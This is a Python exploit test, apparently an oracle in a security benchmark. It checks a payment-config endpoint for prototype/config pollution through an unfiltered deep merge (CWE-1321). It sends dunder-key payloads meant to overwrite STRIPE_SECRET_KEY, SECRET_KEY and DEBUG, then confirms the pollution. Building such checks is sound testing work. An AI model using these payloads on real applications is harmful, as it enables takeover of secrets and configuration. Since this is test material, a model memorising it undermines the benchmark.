"""PoC: Config pollution via deep merge on payment config (CWE-1321).

After stage 3, PATCH /config/merchant uses recursive deep_merge
without filtering dunder keys, allowing Flask config pollution.
"""

from mosaic.oracle.exploit import ExploitTest


class StripeDeepMergeExploit(ExploitTest):
    """Pollute payment config via deep merge."""

    @property
    def chain_id(self) -> str:
        return "stripe_deep_merge_config"

    def setup(self) -> None:
        """Set initial merchant config."""
        self.http_post("/config/merchant", json={
            "currency": "usd",
            "notifications": {"email": True},
        })

    def execute(self) -> tuple[bool, str]:
        evidence = []

        # Baseline config
        baseline = self.http_get("/config/merchant")
        if baseline.ok:
            evidence.append(f"Baseline: {baseline.text[:200]}")

        # Test: inject dunder keys via deep merge
        payloads = [
            {"__class__": {"__init__": {"__globals__": {"STRIPE_SECRET_KEY": "sk_pwned"}}}},
            {"notifications": {"__class__": "polluted"}},
            {"SECRET_KEY": "pwned", "DEBUG": True},
        ]

        for payload in payloads:
            resp = self.http_patch("/config/merchant", json=payload)
            if resp.ok:
                evidence.append(f"PATCH accepted: {list(payload.keys())}")

        # Verify pollution
        verify = self.http_get("/config/merchant")
        if verify.ok:
            try:
                data = verify.json()
                data_str = str(data)

                if "__class__" in data_str or "__init__" in data_str:
                    return True, (
                        f"Deep merge pollution confirmed (CWE-1321). "
                        f"Recursive merge stores __class__/__init__ keys on payment config. "
                        + " | ".join(evidence)
                    )

                if data.get("SECRET_KEY") or data.get("DEBUG") is True:
                    return True, (
                        f"Config pollution confirmed (CWE-1321). "
                        f"Arbitrary keys merged into payment config. "
                        f"SECRET_KEY={data.get('SECRET_KEY')}, DEBUG={data.get('DEBUG')}. "
                        + " | ".join(evidence)
                    )
            except Exception as e:
                evidence.append(f"Parse error: {e}")

        return False, "Pollution not confirmed. " + " | ".join(evidence)
